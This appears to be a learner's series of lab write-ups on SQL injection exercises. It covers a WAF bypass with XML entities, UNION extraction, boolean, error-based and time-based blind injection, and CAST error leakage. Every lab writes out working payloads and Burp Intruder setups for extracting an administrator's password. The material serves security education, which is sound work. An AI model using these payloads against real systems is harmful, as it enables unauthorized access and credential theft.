### Lab: SQL Injection with Filter Bypass via XML Encoding (WAF Bypass + Data Extraction)


## Objective
Bypass a Web Application Firewall (WAF) protecting an XML-based SQL injection
point, then extract usernames and passwords from the database.

## Steps Taken

### 1. Identified the injection point
Observed that the stock check feature sent `productId` and `storeId` to the
server in XML format via a `POST /product/stock` request. Sent this request
to Burp Repeater for testing.

### 2. Confirmed input was being evaluated
Tested the `storeId` field with a mathematical expression instead of a plain
number:
```xml
<storeId>1+1</storeId>
```
The application returned stock for a different store — confirming the value
was being evaluated server-side, not just passed through as a literal string.

### 3. Attempted to determine column count
Tried a UNION SELECT to test the underlying query:
```xml
<storeId>1 UNION SELECT NULL</storeId>
```
This request was blocked — the application flagged it as a potential attack,
indicating a WAF (Web Application Firewall) was filtering suspicious SQL
keywords/patterns before they reached the application.

### 4. Bypassed the WAF using XML entity encoding
Since the injection point was inside XML data, encoded the payload using XML
entities (via Burp's Hackvertor extension: Encode → hex_entities), converting
the SQL keywords into a form the WAF's pattern-matching didn't recognize as
malicious, while the XML parser on the server still decoded it back to valid
SQL before execution.

Resent the encoded request and received a normal response — confirming the
WAF was successfully bypassed.

### 5. Determined the query returns a single column
Testing showed that returning more than one column caused the application to
respond with "0 units," indicating an error meaning the original query only
selects a single column.

### 6. Extracted credentials via string concatenation
Since only one column could be returned, concatenated the username and
password fields into a single value using a separator character:
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```
This returned all usernames and passwords from the `users` table, separated
by `~`, within the single allowed column.

### 7. Logged in as administrator
Used the extracted administrator credentials to log in, gaining
administrative access and solving the lab.

## What I Learned
This lab combined three separate concepts into one real attack chain:

1. **WAFs filter patterns, not intent:** the WAF blocked the literal string
   `UNION SELECT`, but had no way to catch the same instruction once it was
   XML-entity encoded and later decoded server-side. This shows why
   defense-in-depth matters: a WAF alone is not a substitute for fixing the
   underlying SQL injection vulnerability.
2. **Column count matters for UNION-based injection:** before data can be
   exfiltrated via UNION SELECT, the attacker must match the number of
   columns in the original query, or the query fails.
3. **String concatenation bypasses single-column limitations:** when only
   one column can be returned, multiple values (like username and password)
   can still be extracted together by concatenating them with a delimiter.

This was the most advanced lab so far in my SQL injection learning, combining
WAF evasion, blind query structure analysis, and credential extraction into a
single realistic attack scenario.


### Lab: Blind SQL Injection with Conditional Responses

## Objective
Exploit a blind SQL injection vulnerability — where the application doesn't
directly display query results or errors — by inferring information one
true/false condition at a time, using the presence/absence of a "Welcome
back" message as the signal.

## Steps Taken

### 1. Identified the injection point
Intercepted the request containing the `TrackingId` cookie using Burp Suite
and confirmed it was being used in a server-side SQL query.

### 2. Confirmed a boolean-based injection was possible
Tested a condition known to be true:
TrackingId=xyz' AND '1'='1
The "Welcome back" message appeared. Then tested a condition known to be false:
TrackingId=xyz' AND '1'='2
The message disappeared. This confirmed the application's response visibly
changes based on whether the injected condition evaluates to true or false —
the foundation of blind SQL injection.

### 3. Confirmed table and user existence
Used subqueries to test for the existence of specific data without ever
seeing the data directly:
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Both returned true, confirming a `users` table exists and contains an
`administrator` account.

### 4. Determined password length
Used the `LENGTH()` function combined with the same true/false technique,
incrementing the tested length each time:
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
Increased N manually via Burp Repeater until the condition stopped being
true, revealing the password length: 20 characters.

### 5. Extracted the password character-by-character using Burp Intruder
Manually testing every character at every position (20 positions × 36
possible characters) would mean hundreds of requests, so switched to **Burp
Intruder** to automate this:
- Used `SUBSTRING(password, position, 1)` to isolate one character at a time
- Set a payload position marker on the character being guessed:
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
- Configured the payload list to lowercase letters (a-z) and digits (0-9)
- Set a **Grep - Match** rule for the string "Welcome back" so Intruder could
  automatically flag which payload produced a true result
- Ran the attack, identified the correct character where "Welcome back"
  appeared (ticked in results)
- Repeated the process for each position (changing offset 1 → 2 → 3...) until
  all 20 characters of the password were recovered

### 6. Logged in as administrator
Used the fully reconstructed password to log in via the account login page,
solving the lab.

## What I Learned
This lab was a significant step up from previous SQL injection labs because
no data was ever directly visible in the response — everything had to be
inferred through true/false behavior alone (a technique called **blind SQL
injection**). Key takeaways:

1. **Any observable difference in application behavior can leak information:**
   here, the presence or absence of a single UI message was enough to
   extract an entire password, one bit of information at a time.
2. **Burp Intruder is essential for scaling manual techniques:** testing 20
   characters against 36 possibilities manually would take hundreds of
   requests; Intruder automates the payload cycling and uses response
   grep-matching to instantly identify the correct value.
3. **SUBSTRING-based extraction is a core blind SQLi technique:** isolating
   one character at a time via a subquery is the standard method for
   extracting unknown data when no direct output channel exists.

This connects to earlier labs (UNION-based extraction, WAF bypass) by showing
a different extraction strategy entirely — used when the application gives no
direct data back, only a behavioral signal.



### Lab: Blind SQL Injection with Conditional Errors

## Objective
Exploit a blind SQL injection vulnerability where the application gives no
visible difference in content between true/false conditions instead,
information must be inferred by deliberately triggering (or avoiding) a
database error, detectable via the HTTP response status code.

## Steps Taken

### 1. Confirmed the injection point was interpreted as SQL
Tested the `TrackingId` cookie with a single quote:
TrackingId=xyz'
This produced an error. Adding a second quote to close the string:
TrackingId=xyz''
removed the error confirming the input was affecting SQL syntax directly.

### 2. Identified the database type
Constructed a subquery to confirm the injection was being processed as valid
SQL, rather than causing an unrelated error:
TrackingId=xyz'||(SELECT '')||'
This still errored. Adding an explicit table name:
TrackingId=xyz'||(SELECT '' FROM dual)||'
resolved the error since Oracle requires all SELECT statements to reference
a table (using `dual` when none is needed), this confirmed the backend
database was **Oracle**.

### 3. Confirmed error-based signaling works
Verified that querying a non-existent table:
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
produced an error, proving the application's error behavior directly reflects
the validity of the injected SQL giving a reliable true/false channel even
without any visible content difference.

### 4. Confirmed table and user existence
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
No error returned, confirming the `users` table exists (using `ROWNUM = 1` to
prevent multiple rows from breaking the query).

### 5. Used conditional errors to test true/false logic
Instead of relying on visible content changes, used a `CASE` statement that
deliberately triggers a divide-by-zero error only when a condition is true:
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
This errored (condition true). Testing a false condition:
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
produced no error confirming conditional error triggering as a reliable
true/false signal.

### 6. Confirmed the administrator account exists
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Triggered an error, confirming the `administrator` user exists.

### 7. Determined password length
Incremented a length check using the same conditional-error technique:
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Increased N via Burp Repeater until the error stopped appearing, revealing a
password length of 20 characters.

### 8. Extracted the password using Burp Intruder
Automated character-by-character extraction using `SUBSTR()` inside the same
conditional-error structure:
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- Set a payload position marker on the guessed character
- Configured payloads: lowercase a-z and 0-9
- Instead of grep-matching text (as in the previous lab), identified the
  correct character by checking the **HTTP status code** in Intruder's
  results HTTP 500 indicated the condition was true (error triggered),
  HTTP 200 indicated false
- Repeated the attack for each character offset (1 → 20) to reconstruct the
  full password

### 9. Logged in as administrator
Used the recovered password to log in and solve the lab.

## What I Learned
This lab is a variant of blind SQL injection called **error-based blind SQLi**,
distinct from the earlier conditional-*content* technique:

1. **Two different blind SQLi signals exist:** conditional differences in
   page *content* (previous lab) vs. conditional *errors/status codes*
   (this lab). When content doesn't change based on true/false conditions,
   deliberately forcing an error (e.g. divide-by-zero) becomes the covert
   channel instead.
2. **Fingerprinting the database matter:** the requirement to reference
   `dual` revealed the backend was Oracle, which directly shaped the syntax
   of every subsequent payload (Oracle-specific functions like `TO_CHAR` and
   `SUBSTR` were required).
3. **Burp Intruder can filter on status code, not just response text:** this
   lab used HTTP 500 vs. 200 as the success indicator instead of grep-matching
   a string, showing Intruder's flexibility for different blind injection
   scenarios.

This reinforces that blind SQL injection isn't one fixed technique it's a
category of approaches, and identifying which observable signal (content,
error, timing) is available is the first step before choosing an extraction
method.



### Lab: SQL Injection with Verbose Error-Based Data Extraction
Completed: [aaj ki date]

## Objective
Exploit a SQL injection vulnerability where the application returns detailed
database error messages — and abuse those error messages to directly leak
sensitive data (usernames and passwords), rather than inferring information
one boolean condition at a time.

## Steps Taken

### 1. Discovered the injection point via HTTP history
Used Burp's Proxy > HTTP history to locate a `GET /` request containing a
`TrackingId` cookie, then sent it to Repeater for testing.

### 2. Confirmed SQL injection with a verbose error
Appended a single quote to the cookie value:
TrackingId=ogAZZfxtOKUELbuJ'
The response returned a **verbose error message** that disclosed the full
SQL query, including the injected value, and explained the issue was an
unclosed string literal — confirming the injection point sits inside a
single-quoted string in the query.

### 3. Fixed the syntax using comment characters
Commented out the rest of the query (including the extra quote causing the
error) using `--`:
TrackingId=ogAZZfxtOKUELbuJ'--
No error was returned — confirming the query was syntactically valid again.

### 4. Built a working boolean condition
Introduced a subquery cast to an integer type, testing with a plain SELECT:
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
This produced a new error stating an `AND` condition must be a boolean
expression — so the payload was adjusted to include a comparison:
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
This returned no error, confirming valid syntax.

### 5. Adapted the query to pull real data — hit a character limit
Modified the subquery to retrieve real data instead of a static value:
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
This brought back the original syntax error — because the cookie had a
character limit, and the long original `TrackingId` value pushed the
trailing comment characters (`--`) out of the request, breaking the query
again.

### 6. Freed up space by removing the original cookie value
Deleted the original `TrackingId` value, keeping only the injected payload:
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
This produced a **new** error — this time generated by the database itself,
indicating the query executed but failed because it returned more than one
row (multiple usernames), which a single integer cast can't handle.

### 7. Limited the query to a single row
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
The resulting error message directly leaked the first username in plain
text:
ERROR: invalid input syntax for type integer: "administrator"
The database, while trying to convert the text `"administrator"` into an
integer (to satisfy the CAST), included the offending value directly inside
its own error message — leaking it to the attacker.

### 8. Leaked the password using the same technique
Swapped the target column:
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
The administrator's password was leaked directly in the resulting error
message.

### 9. Logged in as administrator
Used the leaked credentials to log in and solve the lab.

## What I Learned
This lab introduced a third distinct blind/error-based SQL injection
strategy, different from the previous two labs:

1. **Verbose error messages can leak data directly** — instead of inferring
   information one true/false bit at a time (as in the earlier blind SQLi
   labs), a badly configured error message can hand over the actual data in
   plain text inside a single request, which is far faster than
   character-by-character extraction.
2. **Type casting (CAST AS int) as a data-leak trick** — forcing a text value
   into an incompatible type causes the database to include that value
   inside its own error description, which is a classic technique to exploit
   verbose error reporting.
3. **Character/length limits on injection points are a real practical
   constraint** — the original cookie value consuming space meant the
   payload's comment characters got truncated, breaking the exploit; simply
   shortening the injectable value (removing the original prefix) resolved
   it. This is a reminder to always account for input length limits when
   crafting injection payloads.
4. **This confirmed a PostgreSQL backend** — the specific error message
   format ("invalid input syntax for type integer") is characteristic of
   PostgreSQL, contrasting with the Oracle-specific syntax required in the
   previous lab.

Across the last three labs, I've now practiced three different SQL injection
data-extraction strategies: UNION-based extraction, blind boolean-based
extraction (content and error-triggered), and verbose error-based direct
leakage — giving a solid, well-rounded understanding of how the same core
vulnerability class can be exploited very differently depending on what the
application exposes to the attacker.



### Lab: Blind SQL Injection with Time Delays
Completed: [aaj ki date]

## Objective
Confirm the presence of a blind SQL injection vulnerability in a scenario
where the application gives **no visible difference at all** — no content
change, no error message — by using a database function that deliberately
delays the response, and measuring that delay as the signal.

## Steps Taken

### 1. Located the injection point
Intercepted the request containing the `TrackingId` cookie using Burp Suite
and sent it to Repeater for testing.

### 2. Injected a time-delay payload
Modified the cookie value to:
TrackingId=x'||pg_sleep(10)--
- `||` concatenates the injected string with the rest of the SQL query
  (PostgreSQL string concatenation operator)
- `pg_sleep(10)` is a PostgreSQL function that pauses execution for 10
  seconds before returning
- `--` comments out the remainder of the original query to prevent syntax
  errors

### 3. Observed the delayed response
Submitted the request and confirmed the application took exactly 10 seconds
to respond — proving the injected SQL was executed by the database, even
though the response content looked completely identical to a normal request.

## What I Learned
This lab introduced **time-based blind SQL injection**, the technique used
when an application gives absolutely no observable difference between true
and false conditions — no content change, no error, nothing to grep for.
In that scenario, the only remaining signal is **how long the response takes**.

Key ideas:

1. **Time itself can be a data channel** — by wrapping `pg_sleep()` inside a
   conditional (e.g. `CASE WHEN [condition] THEN pg_sleep(10) ELSE pg_sleep(0)
   END`), an attacker can test true/false conditions purely by measuring
   response time, then extend this into full character-by-character data
   extraction (similar to the earlier blind SQLi labs, but using delay
   instead of content or errors as the signal).
2. **This is the "last resort" of blind SQLi techniques** — it's slower and
   noisier than content-based or error-based extraction (each guess takes
   several seconds instead of being instant), so it's typically only used
   when no other signal is available.
3. **Database fingerprinting continues to matter** — `pg_sleep()` is
   PostgreSQL-specific, so confirming this payload worked also confirms the
   backend database type, the same way `dual` and `TO_CHAR` confirmed Oracle
   in an earlier lab.

This completes a full picture of blind SQL injection signal types I've now
practiced: content-based, error-based, and time-based — covering the three
core ways an attacker can extract information when an application doesn't
directly display query results.



### Lab: Blind SQL Injection with Time Delays and Information Retrieval
Completed: [aaj ki date]

## Objective
Extend basic time-based blind SQL injection into a full data extraction
technique — using response delay (instead of content or errors) as the
true/false signal to recover the administrator's complete password,
character by character.

## Steps Taken

### 1. Confirmed conditional time-based injection works
Tested a true condition:
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
Response took 10 seconds. Tested a false condition:
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
Response returned immediately — confirming the `CASE` statement's delay could
reliably signal true (10s delay) vs. false (no delay), giving a controllable
covert channel purely through timing.

### 2. Confirmed the administrator account exists
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
The 10-second delay confirmed the `administrator` user exists in the `users`
table.

### 3. Determined password length
Incremented a length check the same way as in the earlier boolean-blind lab,
but using delay instead of content/error as the signal:
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
Increased N via Burp Repeater until the delay stopped occurring, confirming
a password length of 20 characters.

### 4. Extracted the password using Burp Intruder
Automated character-by-character extraction using `SUBSTRING()` inside the
same conditional time-delay structure:
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
- Set a payload position marker on the guessed character
- Configured payloads: lowercase a-z and 0-9
- **Critically**, set the Intruder attack's **Resource Pool** to a maximum
  of 1 concurrent request — since this technique relies on precisely
  measuring response time, running multiple requests in parallel would
  distort timing results and make it impossible to reliably detect the
  10-second delay
- Instead of grep-matching text or checking status codes (as in earlier
  labs), identified the correct character by checking the **"Response
  received"** column in Intruder's results — one payload per position would
  show a value around 10,000ms, while all incorrect guesses returned
  quickly
- Repeated the attack for each character offset (1 → 20) to reconstruct the
  full password

### 5. Logged in as administrator
Used the recovered password to log in and solve the lab.

## What I Learned
This lab completed the full time-based blind SQL injection technique,
building directly on the simpler delay-confirmation lab done earlier:

1. **Time delay works exactly like the other blind signals** — the same
   CASE-based conditional logic used in error-based and content-based blind
   SQLi applies here; only the "signal" changes (delay instead of content
   or error).
2. **Concurrency must be controlled for timing attacks** — this is a detail
   unique to time-based extraction; content-based and error-based blind SQLi
   don't require single-threaded requests, but time-based attacks do, since
   parallel requests can interfere with accurate delay measurement.
3. **This technique is the slowest but most universally applicable** — it
   works even when an application shows absolutely no visible difference in
   its response, making it the fallback when neither content-based nor
   error-based signals are available.

Combined with the earlier labs, I've now practiced all four major blind SQL
injection extraction strategies: UNION-based, content-based blind, error-based
blind, and time-based blind — giving a complete, practical understanding of
how SQL injection can be exploited across a wide range of application
behaviors, from fully verbose to completely silent.
